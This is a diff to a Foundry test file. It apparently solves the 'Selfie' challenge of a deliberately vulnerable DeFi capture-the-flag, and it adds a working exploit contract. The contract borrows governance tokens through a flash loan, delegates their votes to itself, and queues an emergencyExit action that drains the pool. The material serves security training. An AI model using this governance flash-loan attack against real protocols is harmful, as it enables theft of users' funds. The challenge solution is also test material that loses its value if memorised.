@@ -63,6 +63,14 @@ contract SelfieChallenge is Test {
      */
     function test_selfie() public checkSolvedByPlayer {
         
+        console.log("Nonce of Player: ", vm.getNonce(player));
+        ExploitSelfie exploitSelfie = new ExploitSelfie();
+          console.log("Nonce of Player: ", vm.getNonce(player));
+        exploitSelfie.attack(pool, token, TOKENS_IN_POOL - 1, recovery);
+                console.log("Nonce of Player: ", vm.getNonce(player));
+
+        vm.warp(block.timestamp + 2 days);
+        pool.governance().executeAction(1);
     }
 
     /**
@@ -73,4 +81,36 @@ contract SelfieChallenge is Test {
         assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
         assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
     }
+}
+
+
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
+contract ExploitSelfie is IERC3156FlashBorrower {
+    SelfiePool pool;
+    constructor(){}
+    function attack(SelfiePool _pool, DamnValuableVotes _token, uint256 tokensInPool, address recovery) public{
+        pool = _pool;   
+  
+        bytes memory data = abi.encodeCall(pool.emergencyExit, (recovery));
+        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(_token),  tokensInPool, data);
+        
+    }
+
+    function onFlashLoan(
+        address initiator,
+        address token,
+        uint256 amount,
+        uint256 fee,
+        bytes calldata data
+    ) external override returns (bytes32){   
+        DamnValuableVotes votingToken = DamnValuableVotes(token);
+        votingToken.delegate(address(this));
+        
+        SimpleGovernance simpleGovernance = pool.governance();
+        simpleGovernance.queueAction(address(pool), 0, data);
+        votingToken.approve(address(pool), votingToken.balanceOf(address(this)));
+        return bytes32(keccak256("ERC3156FlashBorrower.onFlashLoan"));
+    }
+
 }
